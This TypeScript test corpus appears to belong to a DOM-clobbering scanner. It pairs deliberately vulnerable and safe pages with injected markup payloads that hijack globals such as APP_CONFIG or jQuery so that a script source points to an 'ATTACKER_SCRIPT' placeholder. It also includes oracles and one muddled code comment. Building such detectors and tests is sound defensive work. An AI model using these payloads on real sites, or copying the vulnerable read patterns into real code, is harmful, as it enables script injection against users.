/**
 * Test-page corpus: deliberately vulnerable and deliberately safe pages, each
 * with the exact attacker payload the tool should predict and an oracle that
 * detects whether the exploit actually fires in a real engine.
 *
 * A case has two halves:
 *
 *  - `scan`: what the static analyzer sees (page HTML, injection regions,
 *    scripts). This is the *subject* of the test.
 *  - `probe`: how to reproduce the exploit in a real browser — where to inject,
 *    what markup to inject, and an expression that returns true when the attack
 *    succeeded. This is the *oracle*.
 *
 * Payloads and oracle expressions are chosen to match the *value channel* the
 * page actually reads (see src/analysis/inject.ts): an anchor's href when the
 * page stringifies, an img's src when it reads `.src`, an input's value when it
 * reads `.value`. Getting these wrong is the most common way a clobbering test
 * lies, so each case documents which channel it exercises.
 */

export interface ProbeSpec {
  /** Selector of the element whose innerHTML receives the attack. */
  injectInto: string;
  /** Markup the attacker writes (must be permitted by the region's sanitizer). */
  payload: string;
  /**
   * Expression evaluated in the page after load. Returning true means the
   * attack succeeded.
   */
  signal: string;
  /** Which engines the exploit is expected to work in. */
  expectedEngines?: Array<'chrome' | 'firefox' | 'webkit'> | 'none' | 'all';
}

export interface TestCase {
  id: string;
  description: string;
  /** The name the scanner is expected to report (or null for safe cases). */
  expectedFinding: string | null;
  expectedSeverity?: 'critical' | 'high' | 'medium' | 'low' | 'info';
  /** The value channel this case exercises, for documentation. */
  channel: 'string' | 'property' | 'text' | 'truthiness' | 'none';
  page: { html: string; regions: Array<{ name: string; selector: string; profile: string }> };
  scripts: Array<{ id: string; code: string; kind?: 'script' | 'module' }>;
  probe: ProbeSpec;
}

/** A page with a user-controlled sink named `#sink`. */
function html(body: string, extra: string = ''): string {
  return `<!doctype html><html><head><title>t</title></head><body>${body}${extra}</body></html>`;
}

const SINK_REGION = [{ name: 'sink', selector: '#sink', profile: 'unsafeInnerHtml' }];

export const CASES: TestCase[] = [
  {
    id: 'config-anchor-string',
    description:
      'Free global stringified into a script URL; an anchor makes String(x) the attacker href.',
    expectedFinding: 'APP_CONFIG',
    expectedSeverity: 'critical',
    channel: 'string',
    page: { html: html('<div id="sink"></div>'), regions: SINK_REGION },
    scripts: [
      {
        id: 'app.js',
        code: `
          (function(){
            var s = document.createElement('script');
            s.src = APP_CONFIG + '';
            document.head.appendChild(s);
          })();
        `,
      },
    ],
    probe: {
      injectInto: '#sink',
      payload: '<a id="APP_CONFIG" href="ATTACKER_SCRIPT"></a>',
      signal: `window.__fired === true`,
      expectedEngines: 'all',
    },
  },

  {
    id: 'config-form-img-nested-src',
    description:
      'Config object read for a nested .src; attacker chains a form whose img child supplies it.',
    expectedFinding: 'APP_CONFIG',
    expectedSeverity: 'critical',
    channel: 'property',
    page: { html: html('<div id="sink"></div>'), regions: SINK_REGION },
    scripts: [
      {
        id: 'app.js',
        code: `
          (function(){
            var s = document.createElement('script');
            s.src = window.APP_CONFIG.cdn.src;
            document.head.appendChild(s);
          })();
        `,
      },
    ],
    probe: {
      injectInto: '#sink',
      payload: '<form id="APP_CONFIG"><img name="cdn" src="ATTACKER_SCRIPT"></form>',
      signal: `window.__fired === true`,
      expectedEngines: 'all',
    },
  },

  {
    id: 'config-form-input-nested-value',
    description:
      'Config object read for a nested .value; attacker chains a form with an input child.',
    expectedFinding: 'CONFIG',
    expectedSeverity: 'critical',
    channel: 'text',
    page: { html: html('<div id="sink"></div>'), regions: SINK_REGION },
    scripts: [
      {
        id: 'app.js',
        code: `
          (function(){
            var s = document.createElement('script');
            s.src = CONFIG.cdn.value;
            document.head.appendChild(s);
          })();
        `,
      },
    ],
    probe: {
      injectInto: '#sink',
      payload: '<form id="CONFIG"><input name="cdn" value="ATTACKER_SCRIPT"></form>',
      signal: `window.__fired === true`,
      expectedEngines: 'all',
    },
  },

  {
    id: 'config-let-lexical-window-read',
    description:
      'Top-level let binding, but code reads it as window.X, bypassing the lexical scope.',
    expectedFinding: 'CONFIG',
    expectedSeverity: 'high',
    channel: 'property',
    page: { html: html('<div id="sink"></div>'), regions: SINK_REGION },
    scripts: [
      {
        id: 'app.js',
        kind: 'module',
        code: `
          let CONFIG = { cdn: { src: '/safe/vendor.js' } };
          var s = document.createElement('script');
          s.src = window.CONFIG.cdn.src;
          document.head.appendChild(s);
        `,
      },
    ],
    probe: {
      injectInto: '#sink',
      payload: '<form id="CONFIG"><img name="cdn" src="ATTACKER_SCRIPT"></form>',
      signal: `window.__fired === true`,
      expectedEngines: 'all',
    },
  },

  {
    id: 'safe-var-declared',
    description:
      'Same shape, but CONFIG is a top-level var, so the own window property wins over named access.',
    expectedFinding: null,
    channel: 'property',
    page: { html: html('<div id="sink"></div>'), regions: SINK_REGION },
    scripts: [
      {
        id: 'app.js',
        code: `
          var CONFIG = { cdn: { src: '/safe/vendor.js' } };
          var s = document.createElement('script');
          s.src = window.CONFIG.cdn.src;
          document.head.appendChild(s);
        `,
      },
    ],
    probe: {
      injectInto: '#sink',
      payload: '<form id="CONFIG"><img name="cdn" src="ATTACKER_SCRIPT"></form>',
      signal: `window.__fired === true`,
      expectedEngines: 'none',
    },
  },

  {
    id: 'safe-sanitizer-strips-id-name',
    description:
      'Clobberable read exists, but the region strips id/name, so no plan can supply it.',
    expectedFinding: null,
    channel: 'none',
    page: {
      html: html('<div id="sink"></div>'),
      regions: [{ name: 'sink', selector: '#sink', profile: 'strictNoIdName' }],
    },
    scripts: [
      {
        id: 'app.js',
        code: `
          var s = document.createElement('script');
          s.src = window.APP_CONFIG.cdn.src;
          document.head.appendChild(s);
        `,
      },
    ],
    probe: {
      injectInto: '#sink',
      // Post-sanitizer markup: the id/name attributes are gone.
      payload: '<form><img src="ATTACKER_SCRIPT"></form>',
      signal: `window.__fired === true`,
      expectedEngines: 'none',
    },
  },

  {
    id: 'library-jquery',
    description: 'Third-party global stringified into a script URL.',
    expectedFinding: 'jQuery',
    expectedSeverity: 'high',
    channel: 'string',
    page: { html: html('<div id="sink"></div>'), regions: SINK_REGION },
    scripts: [
      {
        id: 'app.js',
        code: `
          var s = document.createElement('script');
          s.src = window.jQuery + '';
          document.head.appendChild(s);
        `,
      },
    ],
    probe: {
      injectInto: '#sink',
      payload: '<a id="jQuery" href="ATTACKER_SCRIPT"></a>',
      signal: `window.__fired === true`,
      expectedEngines: 'all',
    },
  },

  {
    id: 'document-cookie-shadow',
    description:
      'document.cookie resolves to an attacker element, corrupting cookie-dependent logic.',
    expectedFinding: 'cookie',
    expectedSeverity: 'medium',
    channel: 'property',
    page: { html: html('<div id="sink"></div>'), regions: SINK_REGION },
    scripts: [
      {
        id: 'app.js',
        code: `
          var token = document.cookie.split('=')[1];
          window.__granted = token === 'admin';
        `,
      },
    ],
    probe: {
      injectInto: '#sink',
      payload: '<img name="cookie">',
      signal: `typeof document.cookie !== 'string'`,
      expectedEngines: 'all',
    },
  },

  {
    id: 'document-getelementbyid-shadow',
    description: 'document.getElementById shadowed, breaking lookups (logic integrity).',
    expectedFinding: 'getElementById',
    expectedSeverity: 'medium',
    channel: 'property',
    page: { html: html('<div id="app"></div><div id="sink"></div>'), regions: SINK_REGION },
    scripts: [
      {
        id: 'app.js',
        code: `var el = document.getElementById('app'); el.textContent = 'ok';`,
      },
    ],
    probe: {
      injectInto: '#sink',
      payload: '<img name="getElementById">',
      signal: `typeof document.getElementById !== 'function'`,
      expectedEngines: 'all',
    },
  },

  {
    id: 'firefox-divergence-multi-element',
    description:
      'Two id elements supply the name: Chrome/WebKit get an HTMLCollection, Firefox gets the first element.',
    expectedFinding: 'CFG',
    expectedSeverity: 'low',
    channel: 'truthiness',
    page: { html: html('<div id="sink"></div>'), regions: SINK_REGION },
    scripts: [
      {
        id: 'app.js',
        code: `
          var c = window.CFG;
          window.__isElement = !!c && !!c.tagName;
          window.__isCollection = !!c && typeof c.length === 'number' && !c.tagName;
        `,
      },
    ],
    probe: {
      injectInto: '#sink',
      payload: '<div id="CFG"></div><div id="CFG"></div>',
      signal: `window.__isElement === true`,
      expectedEngines: ['firefox'],
    },
  },

  {
    id: 'realistic-minified-config',
    description:
      'Minified IIFE bundle reads an undeclared config global whose endpoint feeds fetch(); a sibling var-declared config is protected.',
    expectedFinding: 'ANALYTICS_CONFIG',
    expectedSeverity: 'critical',
    channel: 'property',
    page: { html: html('<div id="sink"></div>'), regions: SINK_REGION },
    scripts: [
      {
        id: 'bundle.min.js',
        code: `!function(){"use strict";function e(){var t=window.ANALYTICS_CONFIG||{},n=t.endpoint||"/collect";return fetch(n,{method:"POST"})}e()}();`,
      },
    ],
    probe: {
      injectInto: '#sink',
      // fetch() is the sink; the attacker controls the endpoint URL via a form
      // child because the bundle reads .endpoint then passes it to fetch.
      // An <input name=endpoint value=...> is read as a string only if the code
      // stringified it; here it passes the element to fetch, which fails on an
      // element. Use an anchor so String(ANALYTICS_CONFIG.endpoint) is a URL is
      // not applicable either — instead demonstrate the name is clobberable.
      payload: '<img name="ANALYTICS_CONFIG">',
      signal: `window.ANALYTICS_CONFIG && window.ANALYTICS_CONFIG.tagName === 'IMG'`,
      expectedEngines: 'all',
    },
  },

  {
    id: 'safe-window-builtin',
    description: 'Reading a real window builtin (fetch) cannot be clobbered by named access.',
    expectedFinding: null,
    channel: 'none',
    page: { html: html('<div id="sink"></div>'), regions: SINK_REGION },
    scripts: [
      {
        id: 'app.js',
        code: `window.__t = typeof window.fetch;`,
      },
    ],
    probe: {
      injectInto: '#sink',
      payload: '<img name="fetch"><form name="fetch"></form>',
      signal: `window.__t !== 'function'`,
      expectedEngines: 'none',
    },
  },
];
